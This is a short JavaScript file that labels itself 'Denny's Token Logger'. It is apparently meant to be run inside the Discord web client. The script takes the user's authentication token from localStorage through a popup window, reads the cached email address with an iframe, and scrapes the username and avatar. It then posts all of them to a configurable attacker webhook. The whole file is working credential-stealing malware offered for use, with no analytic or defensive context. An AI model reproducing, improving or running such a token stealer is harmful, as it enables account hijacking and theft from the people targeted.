var webhookurl = 'your_webhook_url_here';

function SendMessage(msg, url, user) {
    const request = new XMLHttpRequest();
    request.open("POST", webhookurl);
  
    request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: user,
        avatar_url: url,
        content: msg
      }

      request.send(JSON.stringify(params));
}

function GetInfo() {
  // Token
  var popup;
  var token;
  
  popup = window.open('', '', `top=0,left=${screen.width-800},width=850,height=${screen.height}`);
    
  window.dispatchEvent(new Event('beforeunload'));
  token = popup.localStorage.token;
  token = token.slice(1, -1); // No more quotes
  
  // Email
  var email = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache;
  
  // Username
  var username = document.getElementsByClassName('size14-e6ZScH title-eS5yk3')[0].innerText;

  SendMessage("@everyone *Denny's Token Logger*\n :email: E-mail **"+ email +"**\n :key: Token **"+token+"**\n :person_red_hair: Username **"+username+"**\n Token logger By Denny", document.getElementsByClassName('avatarStack-2Dr8S9')[0].children[0].src, username);
}

GetInfo();
